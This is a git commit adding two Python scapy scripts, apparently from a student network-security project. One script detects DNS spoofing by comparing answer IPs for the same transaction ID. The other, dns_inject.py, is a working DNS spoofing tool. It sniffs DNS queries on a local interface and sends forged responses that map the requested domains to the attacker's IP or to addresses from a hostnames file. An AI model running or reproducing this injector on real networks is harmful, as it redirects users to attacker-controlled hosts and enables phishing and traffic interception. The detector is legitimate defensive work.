3477e485f83ef25a467fb224f0b73cf18f6718e0
sainathcvs <sainath.cvs@gmail.com>
2017-12-07 16:06:18 -0500

    dns_spoofing files

---
+++ dns_spoofing/dns_detect.py
@@ -0,0 +1,86 @@
+#! /usr/bin/python
+
+from scapy.all import *
+import dpkt
+from sys import argv
+
+
+def have_common_ips(existing_ips,current_ips):
+    print "-------------have_common_ips-------------------"
+    len_min = min(len(existing_ips),len(current_ips))
+    print "existing---",existing_ips
+    print "current---", current_ips
+    if len_min == len(existing_ips):
+        for i in xrange(0,len_min):
+            if existing_ips[i] in current_ips:
+                return True
+    else:
+        for i in xrange(0, len_min):
+            if current_ips[i] in existing_ips:
+                return True
+    return False
+
+
+def print_dns_attack(txID,req,ans1,ans2):
+    print "-------------print_dns_attack-------------------"
+    print 'TXID ',txID,' Request ',req
+    print 'Answer1 ',ans1
+    print 'Answer2 ', ans2
+
+
+def dns_detect(pkt):
+    print "-------------dns_detect-------------------"
+    dns = pkt[DNS]
+    txID = dns.id
+    ans_ips=[]
+    #our ip address by default
+    if dns.qd[0].qtype == dpkt.dns.DNS_A and dns.qd[0].qclass == dpkt.dns.DNS_IN:
+        if(dns.qr ==  dpkt.dns.DNS_Q and dns.qdcount == 1 and dns.nscount == 0 and dns.ancount == 0):
+            #query packet
+            if txID not in txnIDs:
+                print "not txid query----",txID,dns.qd[0].qname[:-1]
+                txnIDs[txID] = {'req':dns.qd[0].qname[:-1],'ips':[]}
+        else:
+            #answer packet
+            if txID not in txnIDs.keys():
+                print "if ancount----",txID,dns.ancount,dns.qd[0].qname[:-1]
+                for i in xrange(0,dns.ancount):
+                    print "ancount----",dns.an[i].rdata
+                    ans_ips.append(dns.an[i].rdata)
+                txnIDs[txID] = {'req':dns.qd[0].qname[:-1],'ips':ans_ips}
+            else:
+                existing_ips = txnIDs[txID]['ips']
+                print "else ancount----",txID,dns.ancount,dns.qd[0].qname[:-1],len(existing_ips)
+                for i in xrange(0,dns.ancount):
+                    print "else ancount----",dns.an[i].rdata
+                    ans_ips.append(dns.an[i].rdata)
+                if len(existing_ips)==0:
+                    txnIDs[txID]['ips'] = ans_ips
+                else:
+                    if len(existing_ips)>0:
+                        is_similar = have_common_ips(existing_ips,ans_ips)
+                        if not is_similar:
+                            print_dns_attack(txID,dns.qd[0].qname[:-1],existing_ips,ans_ips)
+
+if __name__=='__main__':
+    args={}
+    global txnIDs
+    txnIDs={}
+    interface = 'wlp3s0'
+    is_interface_given = False
+    global is_tracefile_given
+    is_tracefile_given = False
+    print "c---",len(argv)
+    while argv:
+        if argv[0][0] == '-':
+            args[argv[0]]=argv[1]
+        argv = argv[1:]
+    if '-i' in args:
+        is_interface_given = True
+        interface = args['-i']
+        print(args['-i'])
+    if '-r' in args:
+        is_tracefile_given= True
+        hostfile = args['-r']
+        print(args['-r'])
+    pkts = sniff(iface=interface, filter="udp port 53",prn=dns_detect)
---
+++ dns_spoofing/dns_inject.py
@@ -0,0 +1,61 @@
+#! /usr/bin/python
+
+from scapy.all import *
+import dpkt
+from sys import argv
+import netifaces as ni
+
+def dns_spoof(pkt):
+    dns = pkt[DNS]
+    dns.an = []
+    #our ip address by default
+    if(dns.qr ==  dpkt.dns.DNS_Q and dns.qdcount == 1 and dns.nscount == 0 and dns.ancount == 0 and dns.qd[0].qtype == dpkt.dns.DNS_A and dns.qd[0].qclass == dpkt.dns.DNS_IN):
+        #print "Found a valid DNS query packet",is_hostfile_given
+        hostname=(dns.qd[0].qname)[:-1]
+        if is_hostfile_given:
+            if hostname in hostnames.keys():
+                    spoof_ip = hostnames[hostname]
+            else:
+                return
+        else:
+            spoof_ip = ni.ifaddresses('wlp3s0')[ni.AF_INET][0]['addr']
+
+        #create a resource record for dns response
+        spoofpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                   DNS(id=pkt[DNS].id, qr=dpkt.dns.DNS_R, ra=1,rd=1,
+                       qd=pkt[DNS].qd,an=DNSRR(type=dpkt.dns.DNS_A,rclass = dpkt.dns.DNS_IN,rrname=dns.qd[0].qname,ttl=6,rdata=spoof_ip))
+        #print("Spoof pkt prepared.")
+        spoofpkt.show()
+        send(spoofpkt, verbose=0)
+        #print ("Sent spoofed pkt")
+
+if __name__=='__main__':
+    args={}
+    global interface
+    interface = 'wlp3s0'
+    hostfile = 'hostnames.txt'
+    is_interface_given = False
+    global is_hostfile_given
+    is_hostfile_given = False
+    global hostnames
+    hostnames={}
+    print "vv---",argv
+    while argv:
+        if argv[0][0] == '-':
+            args[argv[0]]=argv[1]
+        argv = argv[1:]
+    if '-i' in args:
+        is_interface_given = True
+        interface = args['-i']
+    if '-h' in args:
+        is_hostfile_given= True
+        hostfile = args['-h']
+    #get the hostnames from the file
+    if is_hostfile_given:
+        f=open(hostfile,'r')
+        for line_old in f:
+            line = line_old.rstrip('\r\n')
+            spoof_i = line.split('  ')[0]
+            spoof_domain = line.split('  ')[1]
+            hostnames[spoof_domain] = spoof_i
+    pkts = sniff(iface=interface, filter="udp dst port 53",prn=dns_spoof)
